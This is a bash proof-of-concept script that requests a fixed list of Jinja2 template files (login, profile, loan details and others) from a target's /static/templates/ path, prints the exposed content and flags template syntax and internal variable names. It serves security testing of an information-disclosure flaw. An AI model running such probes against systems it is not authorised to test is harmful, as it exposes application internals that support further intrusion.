#!/bin/bash

# POC: Template Syntax and Application Logic Exposure via Accessible Static Templates
# This script demonstrates that Jinja2 template files are directly accessible in /static/templates/
# revealing internal application structure, variable names, and logic

TARGET_URL="${1:-http://localhost}"
TEMPLATES=("error.html" "home.html" "profile.html" "loan_details.html" "login.html" "not_implemented.html")

echo "[*] Testing for Accessible Static Template Files"
echo "[*] Target: $TARGET_URL/static/templates/"
echo ""

# Track findings
VULNERABLE=0
TEMPLATES_FOUND=0

for template in "${TEMPLATES[@]}"; do
    echo "[*] Attempting to access: $TARGET_URL/static/templates/$template"
    
    response=$(curl -s -w "\n%{http_code}" "$TARGET_URL/static/templates/$template")
    http_code=$(echo "$response" | tail -n1)
    content=$(echo "$response" | head -n-1)
    
    if [ "$http_code" = "200" ]; then
        TEMPLATES_FOUND=$((TEMPLATES_FOUND + 1))
        VULNERABLE=$((VULNERABLE + 1))
        
        echo "[+] SUCCESS - Template accessible (HTTP $http_code)"
        echo "    Content snippet (first 300 chars):"
        echo "    ---"
        echo "$content" | head -c 300
        echo ""
        echo "    ---"
        
        # Check for Jinja2 syntax indicators
        if echo "$content" | grep -q "{{"; then
            echo "[!] Jinja2 variable syntax detected: {{ }}"
        fi
        if echo "$content" | grep -q "{%"; then
            echo "[!] Jinja2 control syntax detected: {% %}"
        fi
        
        # Check for specific indicators of internal structure
        if echo "$content" | grep -qE "url_for|user\.|loan_"; then
            echo "[!] Internal structure/variables exposed in template"
        fi
        
        echo ""
    else
        echo "[-] Not accessible (HTTP $http_code)"
        echo ""
    fi
done

echo "=========================================="
echo "SUMMARY:"
echo "=========================================="
echo "Total templates checked: ${#TEMPLATES[@]}"
echo "Templates found and accessible: $TEMPLATES_FOUND"
echo ""

if [ $VULNERABLE -gt 0 ]; then
    echo "[VULNERABLE] $VULNERABLE template files are publicly accessible!"
    echo ""
    echo "Exposed Information:"
    echo "- Application uses Flask (url_for() function)"
    echo "- Application uses Jinja2 templating engine"
    echo "- Internal structure and variable names are revealed"
    echo "- Potential attack vectors can be identified"
    exit 0
else
    echo "[-] No vulnerable template files found"
    exit 1
fi